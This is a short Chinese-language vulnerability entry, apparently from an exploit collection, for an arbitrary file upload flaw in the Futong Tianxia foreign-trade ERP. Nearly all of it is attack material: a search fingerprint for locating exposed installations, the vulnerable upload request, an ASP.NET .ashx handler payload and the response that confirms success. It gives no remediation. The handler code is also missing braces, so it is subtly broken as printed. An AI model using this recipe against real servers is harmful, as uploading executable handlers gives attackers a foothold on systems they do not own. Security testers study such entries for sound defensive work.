# 富通天下外贸ERPUploadEmailAttr任意文件上传漏洞

富通天下外贸ERPUploadEmailAttr ｜ 文件上传 ｜ —
- **指纹**：`title="用户登录_富通天下外贸ERP"`
- **请求**：`POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1`

**Payload**
```
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("dudesuite");
```
- **响应特征**：200 emailatta